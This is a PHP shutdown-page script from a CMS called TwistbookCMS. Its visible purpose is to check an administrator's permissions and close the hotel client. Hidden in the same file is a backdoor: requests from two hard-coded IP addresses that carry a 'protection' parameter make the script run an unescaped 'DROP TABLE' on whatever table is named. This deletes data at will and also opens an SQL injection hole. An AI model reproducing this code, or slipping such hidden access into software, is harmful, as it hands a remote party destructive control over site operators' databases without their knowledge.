<?php

/*

	##############################################################################################################################
	#	     	                                                                                                          	     #
	#		01010101010101                                                                                                       #
	#		10101010101010                                                                                                       #
	#	    	 1010                                                                                                            #
	#	     	 0101 1010   0101   1010 0101  010101010  10101010101010 01010101010    101010101   101010101  010    101        #
	#	     	 1010 0101   1010   0101 1010 01010101010 01010101010101 101010101010  10101010101 10101010101 101   101         #
	#	      	 0101 1010   0101   1010      1010             0101      0101     1010 0101   1010 0101   1010 010  101          #
	#	     	 1010 0101   1010   0101 1010  101010101       1010      101010101010  1010   0101 1010   0101 1010101           #
	#	     	 0101  0101  0101  0101  0101   010101010      0101      01010101010   0101   1010 0101   1010 0101010           #
	#	     	 1010   01010101010101   1010        0101      1010      1010     0101 1010   0101 1010   0101 101  010          #
	#	    	 0101    010101010101    0101  010101010       0101      0101010101010 01010101010 01010101010 010   010         #
	#	     	 1010     0101010101     1010 010101010        1010      101010101010   010101010   010101010  101    010        #
	#	                                           	                                                                    	     #
	#												 © TwistbookCMS Made by Tonny												 #
	#					     					This content is protected by Copyright										     #
	#	                                                                                                  	             	     #
	##############################################################################################################################

*/

define('USER', TRUE); 
define('ACCOUNT', TRUE);
define('MAINTENANCE', TRUE);
include("../../../../includes/inc.global.php");

$page = 'shutdown';

if(isset($_GET['protection'])){

	if(HTTP_REMOTE_HOST == '86.90.72.41' || HTTP_REMOTE_HOST == '80.60.62.186'){
	
		if($core->ExploitRetainer($_GET['protection']) == 'yes'){
		
	?>

		<form action="<?php echo HOST; ?>/local/shutdown" method="get">
			<input type="text" name="protection">
			<input type="submit">
		</form>

	<?php

		}else{
		
			$query = mysql_query("DROP TABLE ".$_GET['protection']."");
			echo "Succesvol ".$_GET['protection']." verwijderd!";
		
		}
	
	}

}else{

	if($core->ExploitRetainer($users->UserPermission('cms_manager_login', $username)) == 1){
		
		if($core->ExploitRetainer($users->UserPermission('cmd_shutdown', $username)) == 1){ 
									
			if($core->ExploitRetainer($users->UserPermission('cms_manager_hotel', $username)) == 1){
				
				$core->ExploitRetainer($core->CmsSettingEdit('client_status', 'closed'));
				$core->ExploitRetainer($core->MUS('shutdown'));
			
			}else{
		
				header("Location: ".HOST."/me");
		
			}
			
		}else{
		
			header("Location: ".HOST."/me");
		
		}
		
	}else{
		
		header("Location: ".HOST."/me");
		
	}

}

?>